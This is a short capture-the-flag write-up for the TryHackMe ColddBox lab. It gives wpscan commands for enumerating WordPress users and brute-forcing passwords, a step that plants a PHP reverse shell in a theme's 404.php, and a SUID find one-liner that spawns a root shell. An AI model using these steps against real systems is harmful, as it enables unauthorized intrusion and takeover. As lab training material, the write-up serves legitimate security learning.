# Colddbox-CTF
TryHackMe colddbox ctf
Only 80 ports is open(which apche httpd 2.4.18)

#directory enumeration:- found wordpress directory:
wp-login,wp-content

#bruteforce the username first through wpscan tool.

found 3 usernames:- hugo, c0ldd, philip [Command:- wpscan --url http://10.10.84.214/ -e u -t 10]

#Now find password of any one user

c0ldd:9876543210 [Command:- wpscan --url http://10.10.84.214/ --usernames user.txt --passwords rockyou.txt -t 50]

upload php backdoor script in appearance/themes/404.php #(use pentestmonkey reverse shell)

try to gain access using this [URL:- http://10.10.182.237/wp-content/themes/twentyfifteen/404.php]

Found the shell of normal user which is www-data

priv esec

find suid through find command using [Command:- find / -perm -u=s -type f 2>/dev/null] and i got find suid binary

Use this [Command:- /usr/bin/find . -exec /bin/sh -p \; -quit] 

and get root and read user.txt and root.txt file and finally go to bed.:)

